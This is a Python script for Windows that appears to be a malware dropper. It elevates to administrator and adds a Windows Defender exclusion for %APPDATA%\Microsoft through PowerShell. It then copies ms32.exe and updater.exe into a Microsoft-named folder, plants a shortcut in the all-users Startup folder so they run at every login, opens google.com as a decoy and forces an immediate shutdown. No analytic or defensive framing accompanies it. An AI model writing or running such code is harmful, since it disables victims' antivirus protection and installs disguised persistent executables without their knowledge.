import os
import shutil
import ctypes
from elevate import elevate
from webbrowser import open as open_t
import subprocess
from time import sleep
# Check if the script is running with administrator privileges (Windows version)
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        return False

if not is_admin():
    elevate()

source_path_exe = 'ms32.exe'
source_folder = 'effects'
source_updater = 'updater.exe'
source_shortcut = "ms32.lnk"

appdata_path = os.path.expandvars(r"%APPDATA%\Microsoft\MS32")
destination_path_exe = os.path.join(appdata_path, 'ms32.exe')
destination_folder = os.path.join(appdata_path, 'effects')
destination_updater = os.path.join(appdata_path, 'updater.exe')
destination_shortcut = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ms32.lnk"
if os.path.exists(appdata_path):
    shutil.rmtree(appdata_path)
os.mkdir(appdata_path)
path = os.path.expandvars(r"%APPDATA%\Microsoft")
def run_powershell_command(command):
    try:
        result = subprocess.run(
            ["powershell", "-Command", command],
            capture_output=True,
            text=True,
            shell=True
        )
        if result.returncode != 0:
            raise Exception(result.stderr.strip())
        return result.stdout.strip()
    except Exception as e:
        return f"Error: {e}"

command = f"Add-MpPreference -ExclusionPath '{path}'"
run_powershell_command(command)
try:
    shutil.copy(source_path_exe, destination_path_exe)
    print(f"File copied from {source_path_exe} to {destination_path_exe}")

    shutil.copy(source_shortcut, destination_shortcut)
    print(f"File copied from {source_shortcut} to {destination_shortcut}")
    
    shutil.copy(source_updater, destination_updater)
    print(f"File copied from {source_shortcut} to {destination_shortcut}")
    open_t("https://google.com")
    sleep(3)
    os.system("shutdown /s /t 0")
except FileNotFoundError as e:
    print(f"Error: Source file or folder not found.")
    print(f"Details: {e}")

except PermissionError as e:
    print(f"Error: Permission denied while accessing the destination.")
    print(f"Details: {e}")

except Exception as e:
    print(f"An unexpected error occurred: {e}")
